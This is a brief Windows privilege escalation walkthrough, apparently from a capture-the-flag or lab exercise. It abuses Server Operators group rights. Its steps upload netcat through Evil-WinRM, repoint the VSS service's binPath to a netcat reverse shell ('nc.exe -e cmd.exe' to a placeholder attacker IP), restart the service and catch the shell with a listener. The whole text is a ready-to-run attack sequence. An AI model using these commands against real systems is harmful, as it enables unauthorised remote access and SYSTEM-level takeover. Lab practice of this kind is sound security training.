
**Group:** `Server Operators` → can **start/stop services** → privilege escalation

**Upload Netcat**

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe
```

**Reconfigure Service (VSS)**

```bash
sc.exe config vss binPath= "C:\Users\svc-printer\Documents\nc.exe -e cmd.exe {{attackerIP}} {{port}}"
```

**Restart Service**

```bash
sc.exe stop vss
sc.exe start vss
```

**Catch Shell**

```bash
nc -lvnp {{port}}
```